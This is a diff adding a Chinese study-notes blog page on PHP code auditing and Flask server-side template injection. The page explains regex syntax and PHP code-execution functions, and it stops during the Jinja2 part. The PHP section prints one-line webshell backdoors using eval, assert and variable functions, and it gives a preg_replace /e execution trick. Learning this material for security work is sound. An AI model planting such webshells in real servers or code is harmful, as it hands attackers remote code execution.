@@ -1,0 +1,890 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/D7595533-A8D5-4519-BF7F-065D11AC0493.2fqu8w452yyo.jpg">
+  <link rel="icon" href="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/D7595533-A8D5-4519-BF7F-065D11AC0493.2fqu8w452yyo.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hhh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="php代码审计正则表达式语法规则? 通配符匹配文件名中的 0 个或 1 个字符，而 * 通配符匹配零个或多个字符 像 data(\w)?.dat 这样的模式将查找下列文件： 12345data.datdata1.datdata2.datdatax.datdataN.dat  使用 * 字符代替 ? 字符扩大了找到的文件的数量。data.*.dat 匹配下列所有文件： 123456data.datd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php代码审计，flaskssti">
+<meta property="og:url" content="http://example.com/2023/01/14/web-%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="lekc">
+<meta property="og:description" content="php代码审计正则表达式语法规则? 通配符匹配文件名中的 0 个或 1 个字符，而 * 通配符匹配零个或多个字符 像 data(\w)?.dat 这样的模式将查找下列文件： 12345data.datdata1.datdata2.datdatax.datdataN.dat  使用 * 字符代替 ? 字符扩大了找到的文件的数量。data.*.dat 匹配下列所有文件： 123456data.datd">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.runoob.com/wp-content/uploads/2014/03/CEBB49BB-B1AD-4539-AC7A-B40DDC62D1B2.jpg">
+<meta property="article:published_time" content="2023-01-14T12:15:32.000Z">
+<meta property="article:modified_time" content="2023-02-17T03:14:59.184Z">
+<meta property="article:author" content="hhh">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="总结">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.runoob.com/wp-content/uploads/2014/03/CEBB49BB-B1AD-4539-AC7A-B40DDC62D1B2.jpg">
+  
+  
+  
+  <title>php代码审计，flaskssti - lekc</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":40,"cursorChar":"","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 50vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lekc</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" false
+     style="background: url('https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A65DBEB1-57E2-43F3-B625-D2BFCD60C20D.5ni8azxc6934.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">php代码审计，flaskssti</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-14 20:15" pubdate>
+          2023年1月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.3k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="web总结"
+        id="heading-93a5163c4acc4270114b31bc9983d019" role="tab" data-toggle="collapse" href="#collapse-93a5163c4acc4270114b31bc9983d019"
+        aria-expanded="true"
+      >
+        web总结
+        <span class="list-group-count">(2)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-93a5163c4acc4270114b31bc9983d019"
+           role="tabpanel" aria-labelledby="heading-93a5163c4acc4270114b31bc9983d019">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/01/14/web-%E6%80%BB%E7%BB%93/" title="php代码审计，flaskssti"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">php代码审计，flaskssti</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/02/05/sql%E6%B3%A8%E5%85%A5/" title="sql注入"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">sql注入</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">php代码审计，flaskssti</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h1><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>? 通配符匹配文件名中的 0 个或 1 个字符，而 * 通配符匹配零个或多个字符</p>
+<p>像 data(\w)?.dat 这样的模式将查找下列文件：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">data<span class="hljs-selector-class">.dat</span><br>data1<span class="hljs-selector-class">.dat</span><br>data2<span class="hljs-selector-class">.dat</span><br>datax<span class="hljs-selector-class">.dat</span><br>dataN.dat<br></code></pre></td></tr></table></figure>
+
+<p>使用 * 字符代替 ? 字符扩大了找到的文件的数量。data.*.dat 匹配下列所有文件：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">data<span class="hljs-selector-class">.dat</span><br>data1<span class="hljs-selector-class">.dat</span><br>data2<span class="hljs-selector-class">.dat</span><br>data12<span class="hljs-selector-class">.dat</span><br>datax<span class="hljs-selector-class">.dat</span><br>dataXYZ.dat<br></code></pre></td></tr></table></figure>
+
+<p>正则表达式的使用，可以通过简单的办法来实现强大的功能。下面先给出一个简单的示例：</p>
+<p><img src="https://www.runoob.com/wp-content/uploads/2014/03/CEBB49BB-B1AD-4539-AC7A-B40DDC62D1B2.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload alt="img"></p>
+<ul>
+<li>^ 为匹配输入字符串的开始位置。</li>
+<li>[0-9]+匹配多个数字， [0-9] 匹配单个数字，+ 匹配一个或者多个。</li>
+<li>abc$匹配字母 abc 并以 abc 结尾，$ 为匹配输入字符串的结束位置。</li>
+</ul>
+<h3 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h3><table>
+<thead>
+<tr>
+<th>[ABC]</th>
+<th>匹配 […] 中的所有字符，例如 [aeiou] 匹配字符串 “google runoob taobao” 中所有的 e o u a 字母。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[^ABC]</td>
+<td>匹配除了 […] 中字符的所有字符，例如 [^aeiou] 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字母。</td>
+</tr>
+<tr>
+<td>[A-Z]</td>
+<td>[A-Z] 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。</td>
+</tr>
+<tr>
+<td>.</td>
+<td>匹配除换行符（\n、\r）之外的任何单个字符，相等于 [^\n\r]。</td>
+</tr>
+<tr>
+<td>[\s\S]</td>
+<td>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，不包括换行。</td>
+</tr>
+<tr>
+<td>\w</td>
+<td>匹配字母、数字、下划线。等价于 [A-Za-z0-9_]</td>
+</tr>
+</tbody></table>
+<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table>
+<thead>
+<tr>
+<th>特别字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$</td>
+<td>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td>
+</tr>
+<tr>
+<td>( )</td>
+<td>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
+</tr>
+<tr>
+<td>*</td>
+<td>匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。</td>
+</tr>
+<tr>
+<td>+</td>
+<td>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td>
+</tr>
+<tr>
+<td>.</td>
+<td>匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</td>
+</tr>
+<tr>
+<td>[</td>
+<td>标记一个中括号表达式的开始。要匹配 [，请使用 [。</td>
+</tr>
+<tr>
+<td>?</td>
+<td>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
+</tr>
+<tr>
+<td>\</td>
+<td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
+</tr>
+<tr>
+<td>^</td>
+<td>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
+</tr>
+<tr>
+<td>{</td>
+<td>标记限定符表达式的开始。要匹配 {，请使用 {。</td>
+</tr>
+<tr>
+<td>|</td>
+<td>指明两项之间的一个选择。要匹配 |，请使用 |。</td>
+</tr>
+</tbody></table>
+<h3 id="PHP-正则表达式修饰符"><a href="#PHP-正则表达式修饰符" class="headerlink" title="PHP 正则表达式修饰符"></a>PHP 正则表达式修饰符</h3><p>i 忽略大小写，匹配不考虑大小写</p>
+<p>g	global - 全局匹配 	查找所有的匹配项。</p>
+<p>m 多行独立匹配，如果字符串不包含[n]等换行符就和普通正则一样。<br>s 设置正则符号 . 可以匹配换行符[n]，如果没有设置，正则符号.不能匹配换行符n。<br>x 忽略没有转义的空格 e eval() 对匹配后的元素执行函数。<br>A 前置锚定，约束匹配仅从目标字符串开始搜索<br>D 锁定$作为结尾，如果没有D，如果字符串包含[n]等换行符，$依旧依旧匹配换行符。如果设置了修饰符m，修饰符D 就会被忽略。<br>S 对非锚定的匹配进行分析<br>U 非贪婪，如果在正则字符量词后加“?”，就可以恢复贪婪<br>X 打开与perl 不兼容附件<br>u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要这个。建议UTF-8环境中不要使用这个</p>
+<h2 id="常见执行函数"><a href="#常见执行函数" class="headerlink" title="常见执行函数"></a>常见执行函数</h2><h3 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h3><p>如果一个变量名后有圆括号，php将寻找与变量的值同名的函数，并且尝试执行它。</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?a=assert&amp;b=phpinfo()</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>将字符串当做php代码执行</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>eval函数中参数是字符</p>
+<p>如</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;echo 1;&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>eval规范严格，必须符合PHP代码要求</p>
+<p>(1)eval() 函数把字符串按照 PHP 代码来计算（计算&#x3D;执行）。<br>(2)该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>(3)如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
+<p>eval是一个语言构造器而不是一个函数，不能被可变函数调用</p>
+<p>这也是为什么当把代码使用拼接的方式时时<code>&lt;?php $_POST[&#39;1&#39;]($_POST[&#39;2&#39;]); ?&gt;</code>  虽然逻辑上最后是<code>&lt;?php @eval($_POST[&#39;2&#39;]); ?&gt;</code>，却发现提示返回数据为空</p>
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>与eval()同样将字符串当做php代码执行</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>assert函数中参数为表达式</p>
+<p>如</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">assert</span></span>(<span class="hljs-title">phpinfo</span>()) </span><br></code></pre></td></tr></table></figure>
+
+<p>assert没有那么严格，执行PHP表达式即可</p>
+<p>assert()进行判断表达式，遇到false时也会继续执行</p>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>执行一个正则表达式的搜索和替换</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。（必须）</li>
+<li>$replacement: 用于替换的字符串或字符串数组。（必须）</li>
+<li>$subject: 要搜索替换的目标字符串或字符串数组。（必须）</li>
+<li>$limit: 对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
+<li>$count: ，为替换执行的次数。</li>
+</ul>
+<p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。 </p>
+<p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p>
+<p>preg_replace() 的第一个参数如果存在 &#x2F;e 模式修饰符，则允许代码执行。</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span>,<span class="hljs-string">&quot;addslashes(\\1)&quot;</span>, <span class="hljs-variable">$var</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//phpinfo()成功执行</span><br></code></pre></td></tr></table></figure>
+
+<p>如果没有 &#x2F;e 修饰符，可以尝试 %00 截断。</p>
+<h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h4><p>把一个字符串写入文件中</p>
+<p>与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(<span class="hljs-params">file</span>,<span class="hljs-params">data</span>,<span class="hljs-params">mode</span>,<span class="hljs-params">context</span>)</span><br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><em>file</em></th>
+<th>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>data</em></td>
+<td>可选。规定要写入文件的数据。可以是字符串、数组或数据流。</td>
+</tr>
+<tr>
+<td><em>mode</em></td>
+<td>可选。规定如何打开&#x2F;写入文件。可能的值：  	FILE_USE_INCLUDE_PATH 	FILE_APPEND 	LOCK_EX</td>
+</tr>
+<tr>
+<td><em>context</em></td>
+<td>可选。规定文件句柄的环境。 <em>context</em> 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
+</tr>
+</tbody></table>
+<p>data 可以是数组（但不能是多维数组）。</p>
+<p>该函数将返回写入到文件内数据的字节数。</p>
+<p>使用 FILE_APPEND 可避免删除文件中已有的内容。</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;Hello World. Testing!&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="fputs-函数写入文件"><a href="#fputs-函数写入文件" class="headerlink" title="fputs() 	函数写入文件"></a>fputs() 	函数写入文件</h4><p>fputs() 函数是 fwrite() 函数的别名。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">fputs(<span class="hljs-built_in">file</span>,<span class="hljs-built_in">string</span>,<span class="hljs-built_in">length</span>)<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><em>file</em></th>
+<th>必需。规定要写入的打开文件。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要写入文件的字符串。</td>
+</tr>
+<tr>
+<td><em>length</em></td>
+<td>可选。规定要写入的最大字节数。</td>
+</tr>
+</tbody></table>
+<p>fwrite() 把 string 的内容写入文件指针 file 处。 如果指定了 length，当写入了 length 个字节或者写完了 string 以后，写入就会停止，视乎先碰到哪种情况。</p>
+<p>fwrite() 返回写入的字符数，出现错误时则返回 false。</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;Hello World. Testing!&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>执行的匹配正则表达式</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">int preg_match ( string $pattern , string $subject [,<span class="hljs-built_in"> array </span>&amp;$matches [,<span class="hljs-built_in"> int </span>$flags = 0 [,<span class="hljs-built_in"> int </span>$offset = 0 ]]] )<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>$pattern: 要搜索的模式，字符串形式。（必须）</li>
+<li>$subject: 输入字符串。（必须）</li>
+<li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li>
+<li>$flags：flags 可以被设置为以下标记值：<ol>
+<li>PREG_OFFSET_CAPTURE:  如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li>
+</ol>
+</li>
+<li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li>
+</ul>
+<p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
+<hr>
+<h1 id="flaskssti"><a href="#flaskssti" class="headerlink" title="flaskssti"></a>flaskssti</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>可以注入的原因在于过于信任用户，服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分</p>
+<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p>
+<h3 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h3><p>SSTI即(server-side template injection)服务器模板注入。SST服务器模板信任了用户的输入，并且执行这些内容，包括执行本机函数。通过输入一些指令在后端处理进行了语句的拼接然后执行。</p>
+<hr>
+<h3 id="python模板注入"><a href="#python模板注入" class="headerlink" title="python模板注入"></a>python模板注入</h3><p>python模板注入漏洞的产生在于Flask应用框架中<code>render_template_string</code>函数在渲染模板的时候使用了%s来动态的替换字符串，而且Flask模板中使用了<code>Jinja2</code>作为模板渲染引擎，<code>&#123;&#123;&#125;&#125;</code>在<code>Jinja2</code>中作为变量包裹标识符，在渲染的时候将<code>&#123;&#123;&#125;&#125;</code>包裹的内容作为变量解析替换，比如<code>&#123;undefined&#123;1+1&#125;&#125;</code>会被解析成2。</p>
+<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>Flask是一个使用 Python 编写的Web应用框架。其WSGI（Web服务器网关接口）工具箱采用 Werkzeug ，模板引擎则使用Jinja2。</p>
+<p>Jinja2引擎存在三种语法：</p>
